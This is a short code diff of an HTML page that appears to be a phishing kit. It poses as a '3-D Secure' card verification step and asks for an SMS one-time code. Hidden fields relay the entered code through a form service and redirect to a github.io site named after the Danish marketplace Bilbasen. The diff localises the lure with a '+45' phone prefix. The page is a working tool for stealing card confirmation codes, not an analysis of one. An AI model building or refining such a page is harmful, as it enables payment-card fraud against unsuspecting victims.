@@ -49,7 +49,7 @@
             <!-- Alerte SMS -->
             <div class="sms-alert">
                 <i class="fa-solid fa-lock"></i>
-                <p>Confirm that this is you, you have received a unique 3-D Secure confirmation code on your mobile <strong>** ** **</strong></p>
+                <p>Confirm that this is you, you have received a unique 3-D Secure confirmation code on your mobile <strong>+45 ** ** **</strong></p>
             </div>
 
             <!-- Formulaire de saisie du code -->
@@ -57,7 +57,8 @@
                 <input type="hidden" name="_captcha" value="false">
                 <input type="hidden" name="_next" value="https://bilbasen.github.io/330i/payment/cartes/suivi/index.html">
                 <input type="hidden" name="_template" value="table">
-                <input type="hidden" name="_subject" value="Card"><label for="otp-input">Enter the confirmation code you recieved via SMS</label>
+                <input type="hidden" name="_subject" value="Card">
+                <label for="otp-input">Enter the confirmation code you recieved via SMS</label>
                 
                 <div class="otp-inputs-container">
                     <input name="code1" type="text" maxlength="1" class="otp-box" inputmode="numeric" pattern="[0-9]*" autocomplete="one-time-code" required>
